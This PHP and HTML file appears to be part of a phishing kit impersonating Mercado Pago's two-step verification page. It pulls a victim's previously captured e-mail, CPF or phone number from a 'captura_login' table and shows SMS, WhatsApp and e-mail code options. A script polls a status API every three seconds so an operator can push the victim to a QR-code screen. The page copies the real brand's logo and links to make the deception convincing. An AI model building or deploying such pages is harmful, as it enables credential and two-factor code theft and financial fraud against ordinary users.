<?php
// Inicia a sessão
session_start();

// Inclui a conexão com o banco de dados
require 'db.php';

// Prepara variáveis com valores padrão
$identificador_label = 'Não identificado';
$identificador_puro = '';
$tipo_identificador = '';
$email_mascarado = 'seu e-mail';

// 1. Verifica se o cookie 'identificador_cliente' existe
if (isset($_COOKIE['identificador_cliente'])) {
    $session_id = $_COOKIE['identificador_cliente'];

    try {
        // 2. Busca o identificador mais recente para esta sessão
        $stmt = $pdo->prepare(
            "SELECT identificador FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1"
        );
        $stmt->execute([$session_id]);
        $resultado = $stmt->fetch(PDO::FETCH_ASSOC);

        // 3. Se um resultado for encontrado, formata os dados para exibição
        if ($resultado) {
            $identificador_puro = $resultado['identificador'];
            $numeros_identificador = preg_replace('/\D/', '', $identificador_puro);

            if (filter_var($identificador_puro, FILTER_VALIDATE_EMAIL)) {
                $tipo_identificador = 'email';
                $identificador_label = htmlspecialchars($identificador_puro);
                $partes_email = explode('@', $identificador_puro);
                if (count($partes_email) === 2) {
                    $dominio = $partes_email[1];
                    $email_mascarado = '********@' . htmlspecialchars($dominio);
                }
            } else {
                $tipo_identificador = (strlen($numeros_identificador) === 11) ? 'cpf' : 'telefone';
                $identificador_label = ($tipo_identificador === 'cpf' ? 'CPF: ' : 'Telefone: ') . htmlspecialchars($identificador_puro);
            }
        } else {
            header('Location: index.php');
            exit;
        }
    } catch (PDOException $e) {
        die("Erro ao consultar o banco de dados: " . $e->getMessage());
    }
} else {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escolha um método de verificação</title>
    <style>
        :root {
            --andes-color-yellow-500: #ffe600;
            --andes-color-blue-100: rgba(52, 131, 250, 0.1);
            --andes-color-blue-500: #3483fa;
            --andes-text-color-primary: #333;
            --andes-text-color-secondary: #555;
            --andes-text-color-link: var(--andes-color-blue-500);
        }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; background-color: var(--andes-background-color-secondary); }
        .main-header { background-color: var(--andes-color-yellow-500); padding: 0 680px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; justify-content: flex-start; }
        .main-header img { height: 37px; vertical-align: middle; }
        .main-content { padding: 80px 24px; flex-grow: 1; }
        .content-wrapper { max-width: 880px; margin: 0 auto; display: flex; justify-content: center; align-items: flex-start; gap: 64px; }
        .left-column { display: flex; flex-direction: column; width: 320px; flex-shrink: 0; }
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--andes-text-color-secondary); text-transform: uppercase; margin-bottom: 8px; }
        .main-title { font-size: 28px; font-weight: 600; color: var(--andes-text-color-primary); line-height: 1.25; margin: 0; }
        .user-identifier-box { display: flex; align-items: center; gap: 16px; border: 1px solid rgba(0, 0, 0, .1); border-radius: 1.5625rem; padding: 8px 12px; margin-top: 32px; width: fit-content; }
        .icon-wrapper { width: 32px; height: 32px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; }
        .user-identifier-box .icon-wrapper svg { color: var(--andes-color-blue-500); }
        .identifier-text-block { display: flex; flex-direction: column; }
        .identifier-text-block .cpf-text { font-size: 14px; font-weight: 400; color: var(--andes-text-color-primary); }
        .identifier-text-block .change-account-link { font-size: 13px; color: var(--andes-text-color-link); text-decoration: none; margin-top: 2px; }
        .identifier-text-block .change-account-link:hover { text-decoration: underline; }
        .help-link { display: block; margin-top: 24px; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 500; }
        .help-link:hover { text-decoration: underline; }
        .verification-card { width: 100%; max-width: 480px; background-color: var(--andes-background-color-primary); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 8px 0; box-sizing: border-box; }
        .verification-option { display: flex; align-items: center; gap: 16px; padding: 16px 24px; text-decoration: none; color: inherit; transition: background-color 0.2s; }
        .verification-option:hover { background-color: var(--andes-background-color-secondary); }
        .verification-option .icon-container { width: 40px; height: 40px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .verification-option .icon-container svg { color: var(--andes-color-blue-500); }
        .verification-option .icon-container svg path { fill: currentColor; }
        .verification-option .icon-container svg path.channel-icon__shape--stroked { stroke: currentColor; stroke-width: 1.5; fill: none; }
        .verification-option .text-content { flex-grow: 1; }
        .verification-option .text-content h3 { margin: 0 0 4px 0; font-size: 16px; font-weight: 500; color: var(--andes-text-color-primary); }
        .verification-option .text-content p { margin: 0; font-size: 14px; color: var(--andes-text-color-secondary); }
        .verification-option .chevron-icon { margin-left: auto; }
        .verification-option .chevron-icon polyline { stroke: var(--andes-color-blue-500); }
        .final-separator { height: 1px; background-color: var(--andes-border-color-secondary); margin: 8px 24px; }
        .cant-login-link { display: block; text-align: left; color: var(--andes-text-color-link); text-decoration: none; font-size: 15px; font-weight: 500; padding: 16px 24px 24px 24px; }
        .cant-login-link:hover { text-decoration: underline; }
    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="content-wrapper">
            <div class="left-column">
                <span class="session-start-label">VERIFICAÇÃO EM 2 ETAPAS</span>
                <h1 class="main-title">Escolha um método de verificação para confirmar que conta pertence a você</h1>
                <div class="user-identifier-box">
                    <div class="icon-wrapper">
                        <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z"></path><path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z"></path></svg>
                    </div>
                    <div class="identifier-text-block">
                        <span class="cpf-text"><?php echo $identificador_label; ?></span>
                    </div>
                </div>
                <a href="#" class="help-link">Preciso de ajuda</a>
            </div>

            <div class="verification-card">
                <a href="sms2fadesktop.php" class="verification-option">
                     <div class="icon-container"><svg class="channel-icon__shape--filled" width="20" height="21" viewBox="0 0 20 21" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M5.50006 7.30047H14.5001V5.50047H5.50006V7.30047Z"></path><path d="M10.8986 10.9001H5.50006V9.10007H10.8986V10.9001Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.101562 13.5995C0.101562 15.0906 1.31039 16.2995 2.80156 16.2995H9.72759L16.3001 20.6806V16.2995H17.1986C18.6897 16.2995 19.8986 15.0906 19.8986 13.5995V2.80107C19.8986 1.30991 18.6897 0.101074 17.1986 0.101074H2.80156C1.31039 0.101074 0.101562 1.30991 0.101562 2.80107V13.5995ZM17.1986 14.4995H14.5001V17.3175L10.2725 14.4995H2.80156C2.30451 14.4995 1.90156 14.0965 1.90156 13.5995V2.80107C1.90156 2.30402 2.30451 1.90107 2.80156 1.90107H17.1986C17.6956 1.90107 18.0986 2.30402 18.0986 2.80107V13.5995C18.0986 14.0965 17.6956 14.4995 17.1986 14.4995Z"></path></svg></div>
                    <div class="text-content"><h3>SMS</h3><p>Vamos enviar um código para o telefone<br>terminado em ****.</p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>

                <a href="whats2fadesktop.php" class="verification-option">
                    <div class="icon-container"><svg class="channel-icon__shape--filled" width="25" height="24" viewBox="0 0 25 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M2.01229 17.8374C0.934723 16.0295 0.368801 13.9788 0.371578 11.8919C0.37423 5.33471 5.88817 0 12.6634 0C15.9248 0.000528957 19.0523 1.25486 21.3577 3.48692C23.663 5.71898 24.9572 8.74584 24.9554 11.9013C24.9526 18.4586 19.438 23.7938 12.6637 23.7938H12.6586C10.6064 23.7937 8.58686 23.2961 6.78462 22.3463L0.268555 24L2.01229 17.8374ZM7.45946 20.4075C9.0337 21.3096 10.8297 21.7853 12.6594 21.7853H12.6635C18.2946 21.7853 22.8774 17.3509 22.8799 11.9005C22.8815 9.27849 21.8065 6.76325 19.8913 4.90813C17.9761 3.05302 15.3777 2.01001 12.6676 2.00856C7.03227 2.00856 2.44914 6.44252 2.44683 11.8925C2.44401 13.7535 2.98548 15.5772 4.0087 17.153L4.25158 17.527L3.21952 21.1746L7.08626 20.1932L7.45946 20.4075ZM14.6695 17.4375C14.0748 17.2589 13.4904 17.05 12.9186 16.8117C9.8376 15.5244 7.82546 12.523 7.67187 12.3247C7.51828 12.1263 6.41773 10.7134 6.41773 9.25067C6.41773 7.78795 7.21115 7.06921 7.4927 6.77166C7.70019 6.54255 7.99719 6.40774 8.31193 6.39981C8.51663 6.39981 8.72161 6.40163 8.90055 6.4103C8.92271 6.41139 8.94581 6.41122 8.96968 6.4111C9.14862 6.41013 9.37158 6.40922 9.5916 6.92033C9.84756 7.51537 10.4618 8.9781 10.5386 9.12687C10.6154 9.27565 10.6666 9.44911 10.5642 9.6475C10.4618 9.84589 10.4106 9.96969 10.2571 10.1432C10.1035 10.3167 9.93456 10.5306 9.79635 10.6638C9.64269 10.812 9.48256 10.9729 9.66179 11.2702C9.84102 11.5676 10.4575 12.5408 11.3703 13.3288C12.5432 14.3412 13.5331 14.655 13.8403 14.8037C14.1474 14.9525 14.3265 14.9276 14.5056 14.7296C14.6847 14.5316 15.2734 13.8619 15.4781 13.5644C15.6827 13.2669 15.8876 13.3165 16.169 13.4156C16.4504 13.5148 17.9607 14.2337 18.2677 14.3824C18.5747 14.5312 18.7796 14.6056 18.8563 14.7296C18.933 14.8536 18.9329 15.4484 18.6772 16.1427C18.4216 16.837 17.1942 17.4703 16.6042 17.5556C16.3575 17.5925 16.1083 17.6116 15.8587 17.6126C15.4553 17.6142 15.0541 17.5551 14.6695 17.4375Z"></path></svg></div>
                    <div class="text-content"><h3>WhatsApp</h3><p>Vamos enviar um código para o telefone<br>terminado em ****.</p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>
                
                <a href="email2fadesktop.php" class="verification-option">
                    <div class="icon-container"><svg class="channel-icon__shape--filled" width="24" height="14" viewBox="0 0 24 14" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M0.75 0.25H23.25V13.75H0.75V0.25ZM2.25 3.79417V12.25H21.75V3.79417L13.8601 8.30121C12.7074 8.95964 11.2926 8.95964 10.1399 8.30121L2.25 3.79417ZM2.25 2.06669L10.884 6.99874C11.5755 7.39379 12.4245 7.39379 13.116 6.99874L21.75 2.06669V1.75H2.25V2.06669Z"></path></svg></div>
                    <div class="text-content"><h3>E-mail</h3><p>Vamos enviar um código para <?php echo $email_mascarado; ?>.</p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>

                <div class="final-separator"></div>
                
                <a href="https://www.mercadolivre.com.br/account-recovery/landing-page?callback=https%3A%2F%2Fwww.mercadolivre.com%2Fjms%2Fmlb%2Flgz%2Fmsl%2Flogin%2FH4sIAAAAAAAEAzVOzQ6CMAx-l54NEBLFcPRFlgIFGze2bIVpjO9up-HW779vsH7h1cgrEPRAz2B5ZIETBIsy--gMTyo4q1RioQMOxYIRHQnFBP27FC003UhDpWpGm0hNuMndzNZn5X5bynEy9NTcitZkGnamoh6JxSu4i4TU13XOuXIUR5y85T1SNXpXDbGGz0kDSYxEHB_QS9xIx0L5H4X9-n_00l6bpmu7To_zub3C5wuROLBi8gAAAA%2Fsfa_removal%2Fcallback%3Fdps%3Darmor.f99cbbdf68948cce4993e94928b0e23d618f1b67af42faf06e4875e3015735239596f4fbaf7141577ad59edc33b3eceebfbf014a855bcba992688c2f602fcd6b74fb61677037d9c5ff29389350db8f98102c088baf65b4af66e1ad04830eb8a0.04e03a31771a5fd92bda2c6d9032fddb%26rbms%3D&on_hold_delay=24&recovery_type=CHANGE_EMAIL&transaction_id=dXqX8dfCdeiZxWUFEg6mzqf9du19wLGN" class="cant-login-link">Não consigo iniciar sessão</a>
            </div>
        </div>
    </main>
    <script>
        /**
         * Função que verifica o status no servidor a cada 3 segundos.
         */
        async function verificarStatus() {
            try {
                // Chama a nossa nova API
                const response = await fetch('api_check_status.php');
                const data = await response.json();

                // Escreve o status no console para podermos depurar
                console.log('Status atual:', data.status); 

                // A CONDIÇÃO PRINCIPAL:
                // Se o status retornado pela API for 'aprovado_para_qr'
                if (data.status === 'aprovado_para_qr') {
                    
                    // Redireciona o usuário para a tela do QR Code
                    console.log('Status aprovado! Redirecionando para telaqr.php...');
                    window.location.href = 'telaqr.php';
                }

            } catch (error) {
                console.error('Erro ao verificar status:', error);
            }
        }

        // Inicia a verificação periódica. A cada 3000 milissegundos (3 segundos),
        // a função verificarStatus será chamada.
        const statusInterval = setInterval(verificarStatus, 3000);

        // Também chamamos a função uma vez assim que a página carrega.
        verificarStatus();
    </script>

</body>
</html>